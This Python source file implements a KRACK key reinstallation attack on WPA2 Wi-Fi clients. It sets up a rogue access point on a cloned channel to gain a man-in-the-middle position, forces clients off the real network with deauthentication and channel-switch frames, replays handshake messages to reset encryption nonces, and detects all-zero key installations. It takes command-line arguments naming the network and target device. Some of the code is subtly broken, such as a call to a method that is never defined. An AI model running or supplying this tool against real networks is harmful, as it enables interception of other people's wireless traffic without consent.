#!/usr/bin/env python2

# import sys, os

# from mitm_channel_based.all import *
# from scapy.layers.dot11 import *
# from scapy.all import *
# import time, argparse, heapq, subprocess, atexit, select, textwrap
# from datetime import datetime

# username = os.path.expanduser(os.environ["SUDO_USER"])  # give sudo permission to all calls
# sys.path.append('/home/' + username + '/.local/lib/python2.7/site-packages')

import sys, os
username = os.path.expanduser(os.environ["SUDO_USER"])
sys.path.append('/home/' + username + '/.local/lib/python2.7/site-packages')

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time, argparse, heapq, subprocess, atexit, select, textwrap
from datetime import datetime

from mitm_channel_based.all import *


class Client():
    """
   Class to hold important information about the client,
   information like if the attack worked, and other technical
   info such as mac address, packets etc..
    """
    Initializing, BeforeAttack, Attack_Started, Success_Reinstalled, Success_AllzeroKey, Failed = range(6)

    def __init__(self, macaddr):
        self.macaddr = macaddr
        self.state = Client.Initializing
        self.attack_time = None
        self.assocreq = None
        self.msg1 = None
        self.msg3s = []
        self.msg4 = None

    def set_first_message(self, handshake_1):
        """
        set the first 4way handshake message
        """
        self.msg1 = handshake_1

    def set_third_message(self, handshake_3):
        """
        store the third 4way handshake message (which we want to replay), only do so if not already seen it.
        """
        if get_eapol_replaynum(handshake_3) in [get_eapol_replaynum(p) for p in self.msg3s]:
            return
        self.msg3s.append(handshake_3)

    def set_state(self, state):
        self.state = state

    def mark_got_mitm(self):
        """
        mark client as connected to the mitm ap
        """
        if self.state < Client.BeforeAttack:
            self.state = Client.BeforeAttack

    def check_state(self, state):
        return self.state == state

    def forward_packet_rules(self, p):
        """
        we want to make sure we forward rules that are correct, e.g, not forward the handshake packets to the attacked AP
        so that we can manipulate them according to the attack.
        """

        # if we are in a position to attack, forward dot11 association, authentication requests
        # and also forward if these are handshake packets between 1 and 3, and ICMP messages. (We really don't want to transfer the forth..)
        if self.state in [Client.BeforeAttack, Client.Attack_Started]:
            return Dot11Auth in p or Dot11AssoReq in p or Dot11AssoResp in p or (
                    1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) \
                   or (p.type == 0 and p.subtype == 13)
        # otherwise if we have already succeeded to attack forward everything to the ap,
        # again, this step is necessary as otherwise no packets will be forwarded!
        # we want to forward all packets in the case we actually got the key already!
        return self.state in [Client.Success_Reinstalled]

    def attack_start(self):
        """
        save time and client state
        """
        self.attack_time = time.time()
        self.set_state(Client.Attack_Started)

    def is_iv_reseted(self, iv):
        return self.check_state(Client.Attack_Started) and iv == 1

    def attack_timeout(self, iv):
        """
        Description: verifies if the attack has timed out

        Conditions:
          Client state is Attack_Started
          It has past 1.5 seconds from the attack start
          The IV value is greater than the max IV registred
        """
        return self.check_state(Client.Attack_Started) and self.attack_time + 1.5 < time.time()


class KRAckAttack():
    """
     class that holds all necessary information about the client, addresses, and interfaces.
                initiates the attack by running the run method.
                Mitm setup was taken from the mitm-channel-based package, which allows for easy setup of
                mitm hostapd configurations.
    """

    def __init__(self, nic_real, rogue_ap_interface, nic_rogue_mon, nic_ether, ssid, clientmac=None, dumpfile=None, cont_csa=False):

        self.nic_rogue_ap = rogue_ap_interface
        self.ssid = ssid
        self.mitmconfig = None

        # This is set in case of targeted attacks
        self.clientmac = clientmac.lower()

        self.client = dict()
        self.disas_queue = []

        # To monitor if interfaces are (still) on the proper channels
        self.last_real_beacon = None
        self.last_rogue_beacon = None

        self.mitmconfig = MitmChannelBased(nic_real, self.nic_rogue_ap, nic_rogue_mon, nic_ether, self.ssid,
                                           self.clientmac)

    def send_disas(self, macaddr):
        """
        Send a disassociation attack
        """
        p = Dot11(addr1=macaddr, addr2=self.mitmconfig.apmac, addr3=self.mitmconfig.apmac) / Dot11Disas(reason=0)
        self.mitmconfig.sock_rogue.send(p)

    def queue_disas(self, macaddr):
        """
        Description: queue the MAC Address of client that has been disassociated

        Arguments:
          macaddr: the client MAC Address
        """
        if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]:
            return
        heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))

    def hostapd_finish_4way(self, stamac):
        """
        Description: send FINISH_4WAY signal to hostapd (Rogue AP)
        """

        self.mitmconfig.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)

    def hostapd_rx_mgmt(self, p):
        """
        Module: mitm_code
        ===
        Class: MitmChannelBased
        ---
        Description: manage packets sent to hostapd instance

        Arguments:
          p: 802.11 packet
        """

        self.mitmconfig.hostapd_ctrl.request("RX_MGMT " + str(p[Dot11]).encode("hex"))

    def hostapd_add_sta(self, macaddr):
        """
        Module: mitm_code
        ===
        Class: MitmChannelBased
        ---
        Description: forward authentication packet to Rogue AP sent by the client

        Arguments:
          macaddr: the MAC address of the client to register
        """

        self.hostapd_rx_mgmt(
            Dot11(addr1=self.mitmconfig.apmac, addr2=macaddr, addr3=self.mitmconfig.apmac) / Dot11Auth(seqnum=1))

    def hostapd_add_allzero_client(self, client):
        if client.assocreq is None:
            return False

        # 1. Add the client to hostapd
        self.hostapd_add_sta(client.macaddr)

        # 2. Inform hostapd of the encryption algorithm and options the client uses
        self.hostapd_rx_mgmt(client.assocreq)

        # 3. Send the handshake msg4 to trigger installation of all-zero key by the modified hostapd
        self.hostapd_finish_4way(client.macaddr)

        return True

    def handle_to_client_pairwise(self, client, p):
        eapol_packet_num = get_eapol_msgnum(
            p)  # get the current packet number, since we don't know what it is, and this is called every time we recieve one.
        if eapol_packet_num == 1 and client.state == Client.BeforeAttack:  # if the packet is the first one, track it.
            client.set_first_message(p)
        elif eapol_packet_num == 3 and client.state == Client.BeforeAttack:  # else it is the third one! (IMPORTANT!)
            client.add_if_new_msg3(p)  # save it!
            if len(client.msg3s) >= 2:  # in case we already got both of the 3rd handshake messages (only if the client sent a new one already!)
                if client.msg1 is not None:
                    packet_list = client.msg3s
                    p = set_eapol_replaynum(client.msg1, get_eapol_replaynum(packet_list[0]) + 1)
                    # add the first handshake message to the packt list
                    packet_list.insert(1, p)

                    for p in packet_list:  # send the packets
                        self.mitmconfig.sock_rogue.send(p)
                    client.msg3s = []
                    # this is when the attack actually starts, so time it, and change status.
                    client.attack_start()
                    # send a deauthentication packet from the ap to the client,
                    # when they reauthenticate they will use the zeroed-key
                    p = Dot11(addr1=self.mitmconfig.apmac, addr2=client.macaddr,
                              addr3=self.mitmconfig.apmac) / Dot11Deauth(reason=3)
                    self.mitmconfig.sock_real.send(p)
                else:
                    client.msg3s = []
                    pass
            return True

        return False

    # todo continue from here.
    def handle_from_client_pairwise(self, client, p):
        iv = dot11_get_iv(p)
        if client.is_iv_reseted(iv):
            self.hostapd_add_allzero_client(client)
            # The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
            client.set_state(Client.Success_AllzeroKey)
        elif client.attack_timeout(iv):
            client.set_state(Client.Failed)

    def real_channel_sniff_handler(self):
        """

        """
        p = self.mitmconfig.sock_real.recv()
        if p is None:
            return

        # Destination is the real ap
        if p.addr1 == self.mitmconfig.apmac:
            # if we got an authentication request to the real ap
            if Dot11Auth in p:
                print_rx(INFO, "Real channel ", p, color="orange")
                if p.addr2 in self.client:  # check if its our client, if it is, it's bad, he needs to be connected to our ap.
                    # try and disconnect the target client from the ap, and move him to our rogue ap.
                    self.mitmconfig.send_csa_beacon(newchannel=self.mitmconfig.rogue_channel, target=p.addr2)
                    self.mitmconfig.send_csa_beacon(newchannel=self.mitmconfig.rogue_channel)
                    self.client[p.addr2] = Client(p.addr2)
                    self.client[p.addr2].set_state(Client.BeforeAttack)

            # save association request for the client, will be used later for encryption testing.
            elif Dot11AssoReq in p:
                if p.addr2 in self.client:
                    self.client[p.addr2].assocreq = p

            # if client wants to deauthenticate, let him and delete for the client field.
            elif Dot11Deauth in p or Dot11Disas in p:
                if p.addr2 in self.client:
                    del self.client[p.addr2]

            # display all frames sent by the client.
            elif p.addr2 in self.client:
                print_rx(INFO, "Real channel ", p)

            # print frames related to the client.
            elif self.clientmac is not None and self.clientmac == p.addr2:
                print_rx(INFO, "Real channel ", p)

            # Prevent the AP from thinking client that are  are sleeping, until attack completed or failed
            if p.FCfield & 0x10 != 0 and p.addr2 in self.client and self.client[p.addr2].state <= Client.Attack_Started:
                self.mitmconfig.sock_real.send(
                    Dot11(type=2, subtype=4, addr1=self.mitmconfig.apmac, addr2=p.addr2, addr3=self.mitmconfig.apmac))

        #  Packet source was the ap (sending to the client)
        elif p.addr2 == self.mitmconfig.apmac:
            # Track time of last beacon we received. Verify channel to assure it's not the rogue AP.
            if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.mitmconfig.real_channel:
                self.last_real_beacon = time.time()

            # decide if we should forward the packet or not.
            # if the destination is our client, and if we should forward the packet or not
            might_forward = p.addr1 in self.client and self.client[p.addr1].forward_packet_rules(p)

            # or if it sent to a group.
            # might_forward = might_forward or (args.group and dot11_is_group(p) and Dot11WEP in p)

            # printing packets.
            if Dot11Deauth in p or Dot11Disas in p:
                print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
            # If targeting a specific client, display all frames it sends
            elif self.clientmac is not None and self.clientmac == p.addr1:
                print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
            # For other clients, just display what might be forwarded
            elif might_forward:
                print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")

            # now do some actual logic,
            if might_forward:  # if it is a candiate to be forwarded
                if p.addr1 in self.client:  # and if the client is the destination
                    client = self.client[
                        p.addr1]  # set the current actual client, in case we are tracking more than one.
                    if self.handle_to_client_pairwise(client, p):  # Handle the key exchange!!
                        pass

                    elif Dot11Deauth in p:  # else if he wants to deatuh
                        del self.client[p.addr1]  # remove from tracking and send the package, allowing him to deatuh
                        self.mitmconfig.sock_rogue.send(p)
                    # in all other situations, just forward the package.
                    else:
                        self.mitmconfig.sock_rogue.send(p)

                # Group addressed frames
                else:
                    self.mitmconfig.sock_rogue.send(p)

    def rogue_channel_sniff_handler(self):
        """
        handles packets sent over the rogue channel, the one we set up and that is different from the original ap
        all
        """
        p = self.mitmconfig.sock_rogue.recv()
        if p is None:
            return

        # This first section is only for printing packets and timing incase we have a timeout, no logic applied.
        # If we sent the packet from our rogue ap
        if p.addr2 == self.mitmconfig.apmac:
            # Track time of last beacon we received needed to assure it is active, channel needed to assure we are on the correct channel.
            if Dot11Beacon in p and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.mitmconfig.rogue_channel:
                self.last_rogue_beacon = time.time()
            # print all frames that are sent to the targeted client
            if self.clientmac is not None and p.addr1 == self.clientmac:
                print_rx(INFO, "Rogue channel", p)
            # And display all frames sent to a MitM'ed client
            elif p.addr1 in self.client:
                print_rx(INFO, "Rogue channel", p)

        # if packet was sent to the real ap (Remember we are on a different channel)
        if p.addr1 == self.mitmconfig.apmac:
            new_client = None
            # if it's a different client (possible because we broadcast the channel switch packets)
            # or if the target client has disconnected from us.
            if Dot11Auth in p and p.addr2 == self.clientmac and self.clientmac not in self.client:
                print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")  # all the below is the exact same procedure
                self.client[p.addr2] = Client(p.addr2)
                self.client[p.addr2].mark_got_mitm()
                new_client = self.client[p.addr2]
                will_forward = True
            # else we already know the client
            elif p.addr2 in self.client:
                new_client = self.client[p.addr2]
                will_forward = new_client.forward_packet_rules(p) # check if we should forward the packet it sent.
                print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
            # Always display all frames sent by the targeted client
            elif p.addr2 == self.clientmac:
                print_rx(INFO, "Rogue channel", p)

            # If this now belongs to a client we want to track, process the packet further
            # thid will happen if either of the above rules were true
            if new_client is not None:
                # Save the association request so we can track the encryption algorithm and options the client uses
                if Dot11AssoReq in p:
                    new_client.assocreq = p
                # Save msg4 so we can complete the handshake once we attempted a key reinstallation attack
                # this is essential to the attack.
                if get_eapol_msgnum(p) == 4:
                    new_client.msg4 = p

                # Client is sending on rogue channel, we got a MitM position =)
                new_client.mark_got_mitm()

                if Dot11WEP in p:
                    # Use encrypted frames to determine if the key reinstallation attack succeeded
                    self.handle_from_client_pairwise(new_client, p)

                if will_forward:
                    # Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
                    if new_client.state < Client.Attack_Started:
                        p.FCfield &= 0xFFEF

                    self.mitmconfig.sock_real.send(p)

        # print all other communication regarding the attacked client.
        elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
            print_rx(INFO, "Rogue channel", p)

    def handle_hostapd_out(self):
        # hostapd always prints lines so this should not block
        line = self.mitmconfig.hostapd.stdout.readline()
        if line == "":
            quit(1)

        if line.startswith(">>>> "):
            log(STATUS, "Rogue hostapd: " + line[5:].strip())
        elif line.startswith(">>> "):
            log(DEBUG, "Rogue hostapd: " + line[4:].strip())
        # This is a bit hacky but very useful for quick debugging
        elif "fc=0xc0" in line:
            (WARNING, "Rogue hostapd: " + line.strip())
        elif "AP-STA-CONNECTED" in line or "sta_remove" in line or "Add STA" in line or "disassoc cb" in line or "disassocation: STA" in line:
            log(INFO, "Rogue hostapd: " + line.strip(), color="green")
        elif "authorizing port" in line or "pairwise key handshake completed" in line:
            log(INFO, "Rogue hostapd: " + line.strip(), color="green")
        elif "Using interface" in line:
            log(INFO, "Rogue hostapd: " + line.strip(), color="green")
        else:
            log(ALL, "Rogue hostapd: " + line.strip())

        self.mitmconfig.hostapd_log.write(datetime.now().strftime('[%H:%M:%S] ') + line)

    def run(self):
        """
        Initializes the attack, after choosing targets
        """

        print("starting attack..")
        self.mitmconfig.run()
        subprocess.Popen(["./monitor_rogue_ap_interface.sh", self.nic_rogue_ap], stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)

        # Try to deauthenticated all clients
        deauth = Dot11(addr1=self.clientmac, addr2=self.mitmconfig.apmac,
                       addr3=self.mitmconfig.apmac) / Dot11Deauth(reason=3)
        self.mitmconfig.sock_real.send(deauth)

        # For good measure, also queue a dissasociation to the targeted client on the rogue channel
        if self.clientmac:
            self.queue_disas(self.clientmac)

        # Continue attack by monitoring both channels and performing needed actions
        self.last_real_beacon = time.time()
        self.last_rogue_beacon = time.time()
        nextbeacon = time.time() + 0.01
        while True:
            sel = select.select([self.mitmconfig.sock_rogue, self.mitmconfig.sock_real, self.mitmconfig.hostapd.stdout],
                                [], [], 0.1)
            if self.mitmconfig.sock_real in sel[0]:
                self.real_channel_sniff_handler()
            if self.mitmconfig.sock_rogue in sel[0]:
                self.rogue_channel_sniff_handler()
            if self.mitmconfig.hostapd.stdout in sel[0]:
                self.handle_hostapd_out()

            while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
                self.send_disas(self.disas_queue.pop()[1])

            # if self.continuous_csa and nextbeacon <= time.time():
            #     self.mitmconfig.send_csa_beacon(newchannel=self.mitmconfig.rogue_channel, silent=True)
            #     nextbeacon += 0.10
            # if self.last_real_beacon + 2 < time.time():
            #     self.last_real_beacon = time.time()
            # if self.last_rogue_beacon + 2 < time.time():
            #     self.last_rogue_beacon = time.time()

    def stop(self):
        if self.mitmconfig.hostapd:
            self.mitmconfig.hostapd.terminate()
            self.mitmconfig.hostapd.wait()
        if self.mitmconfig.hostapd_log:
            self.mitmconfig.hostapd_log.close()
        if self.mitmconfig.sock_real:
            self.mitmconfig.sock_real.close()
        if self.mitmconfig.sock_rogue:
            self.mitmconfig.sock_rogue.close()


def cleanup():
    attack.stop()


if __name__ == "__main__":
    description = textwrap.dedent(
        """\
        Key Reinstallation Attacks
        -----------------------------------------------------------
            - Uses CSA beacons to obtain channel-based MitM position
            - Can detect and handle wpa_supplicant all-zero key installations""")
    parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)

    # Required arguments
    parser.add_argument("nic_realmon",
                        help="Wireless monitor interface that will listen on the channel of the target AP.")
    parser.add_argument("nic_rogue_ap", help="Wireless interface that will run a rogue AP using a modified hostapd.")
    parser.add_argument("nic_ether", help="Rogue AP WAN (ethernet) interface.")
    parser.add_argument("ssid", help="The SSID of the network to attack.")

    # Optional arguments
    parser.add_argument("-m", "--nic-rogue-mon",
                        help="Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.")
    parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
    parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
    parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
    parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames",
                        action='store_true')
    parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)",
                        action='store_true')

    args = parser.parse_args()
    attack = KRAckAttack(args.nic_realmon, args.nic_rogue_ap, args.nic_rogue_mon, args.nic_ether, args.ssid, args.target, args.dump, args.continuous_csa)
    atexit.register(cleanup)
    attack.run()

